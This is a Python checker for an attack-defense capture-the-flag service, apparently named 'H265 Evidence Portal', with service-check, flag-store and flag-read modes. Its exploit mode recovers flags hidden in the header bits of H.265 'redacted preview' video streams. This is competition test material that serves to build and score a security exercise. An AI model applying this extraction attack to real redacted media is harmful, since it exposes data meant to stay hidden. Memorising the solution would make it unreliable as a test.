#!/usr/bin/env python3
import argparse
import json
import secrets
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib


MAGIC = b"H5AD"


def base_url(host: str, port: int) -> str:
    if host.startswith("http://") or host.startswith("https://"):
        return f"{host.rstrip('/')}:{port}" if ":" not in host.rsplit("/", 1)[-1] else host.rstrip("/")
    return f"http://{host}:{port}"


def http_json(url: str, method: str = "GET", body: dict | None = None, timeout: int = 5) -> dict:
    data = None
    headers = {}
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def http_bytes(url: str, timeout: int = 5) -> bytes:
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return resp.read()


def find_nals(data: bytes):
    starts = []
    i = 0
    while i < len(data) - 3:
        if data[i:i + 4] == b"\x00\x00\x00\x01":
            starts.append((i, 4))
            i += 4
        elif data[i:i + 3] == b"\x00\x00\x01":
            starts.append((i, 3))
            i += 3
        else:
            i += 1
    for idx, (start, sc_len) in enumerate(starts):
        end = starts[idx + 1][0] if idx + 1 < len(starts) else len(data)
        nal = data[start + sc_len:end]
        if nal:
            yield nal


def nal_type(nal: bytes) -> int:
    if len(nal) < 2:
        return -1
    return (nal[0] >> 1) & 0x3F


def bits_to_bytes(bits: list[int]) -> bytes:
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        value = 0
        for bit in bits[i:i + 8]:
            value = (value << 1) | bit
        out.append(value)
    return bytes(out)


def extract_secret(bitstream: bytes) -> str:
    bits = []
    for nal in find_nals(bitstream):
        if nal_type(nal) != 35 or len(nal) < 3:
            continue
        primary_pic_type = (nal[2] >> 5) & 0x07
        bits.append(primary_pic_type & 1)
    if len(bits) < 48:
        raise ValueError("not enough aud nals")
    header = bits_to_bytes(bits[:48])
    if header[:4] != MAGIC:
        raise ValueError("missing magic")
    size = struct.unpack(">H", header[4:6])[0]
    packet = bits_to_bytes(bits[:(10 + size) * 8])
    secret = packet[6:6 + size]
    crc = struct.unpack(">I", packet[6 + size:10 + size])[0]
    if (zlib.crc32(secret) & 0xFFFFFFFF) != crc:
        raise ValueError("bad crc")
    return secret.decode("utf-8")


def cmd_check(args) -> int:
    url = base_url(args.host, args.port)
    item_id = f"check_{secrets.token_hex(4)}"
    token = secrets.token_hex(12)
    secret = f"service_check_{int(time.time())}"
    health = http_json(f"{url}/health")
    if not health.get("ok"):
        print("DOWN: bad health")
        return 1
    stored = http_json(f"{url}/api/store", "POST", {"id": item_id, "token": token, "secret": secret})
    if not stored.get("ok"):
        print("MUMBLE: store failed")
        return 1
    read = http_json(f"{url}/api/read", "POST", {"id": item_id, "token": token})
    if read.get("secret") != secret:
        print("MUMBLE: read mismatch")
        return 1
    print("OK")
    return 0


def cmd_put(args) -> int:
    url = base_url(args.host, args.port)
    item_id = args.flag_id or f"flag_{int(time.time())}_{secrets.token_hex(4)}"
    token = secrets.token_hex(16)
    stored = http_json(f"{url}/api/store", "POST", {"id": item_id, "token": token, "secret": args.flag})
    if not stored.get("ok"):
        print("MUMBLE: store failed")
        return 1
    print(json.dumps({"id": item_id, "token": token}, sort_keys=True))
    return 0


def cmd_get(args) -> int:
    url = base_url(args.host, args.port)
    flag_id = json.loads(args.flag_id)
    read = http_json(f"{url}/api/read", "POST", flag_id)
    if read.get("secret") != args.flag:
        print("CORRUPT: flag mismatch")
        return 1
    print("OK")
    return 0


def cmd_exploit(args) -> int:
    url = base_url(args.host, args.port)
    if args.flag_id:
        try:
            decoded = json.loads(args.flag_id)
            items = [{"id": decoded["id"], "preview_url": f"/api/cases/{decoded['id']}/redacted-preview.h265"}]
        except Exception:
            items = [{"id": args.flag_id, "preview_url": f"/api/cases/{args.flag_id}/redacted-preview.h265"}]
    else:
        listing = http_json(f"{url}/api/cases")
        items = listing.get("items", [])

    found = []
    for item in items:
        preview_url = item.get("preview_url") or f"/api/cases/{item.get('id')}/redacted-preview.h265"
        quoted = urllib.parse.quote(preview_url, safe="/._-")
        try:
            bitstream = http_bytes(f"{url}{quoted}")
            secret = extract_secret(bitstream)
        except Exception:
            continue
        if secret.startswith(args.prefix):
            found.append(secret)
    for secret in sorted(set(found)):
        print(secret)
    return 0 if found else 2


def main() -> int:
    parser = argparse.ArgumentParser(description="H265 Evidence Portal AD checker")
    sub = parser.add_subparsers(dest="mode", required=True)

    for name in ("check", "exploit"):
        p = sub.add_parser(name)
        p.add_argument("host")
        p.add_argument("port", type=int)
        if name == "exploit":
            p.add_argument("--prefix", default="blockChainPTIT{")
            p.add_argument("--flag-id")
        p.set_defaults(func=cmd_check if name == "check" else cmd_exploit)

    p = sub.add_parser("put")
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("flag")
    p.add_argument("--flag-id")
    p.set_defaults(func=cmd_put)

    p = sub.add_parser("get")
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("flag_id")
    p.add_argument("flag")
    p.set_defaults(func=cmd_get)

    args = parser.parse_args()
    try:
        return args.func(args)
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, KeyError, ValueError) as exc:
        print(f"DOWN: {exc}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
